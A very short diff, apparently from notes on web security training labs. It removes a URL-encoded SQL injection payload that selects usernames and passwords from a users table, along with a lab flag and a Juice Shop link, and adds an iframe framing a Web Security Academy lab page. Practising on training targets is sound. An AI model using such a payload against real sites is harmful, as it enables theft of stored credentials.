@@ -1,3 +1,1 @@
-Gifts%27+UNION+SELECT+username,+password+FROM+users--
-thm{sqlm@p_is_L0ve}
-https://github.com/juice-shop/juice-shop/releases/tag/v20.1.1
+<iframe src="https://0ac100ed031b83848154e96900a800e8.web-security-academy.net/" frameborder="0" width="1340px" height="640px"></iframe>
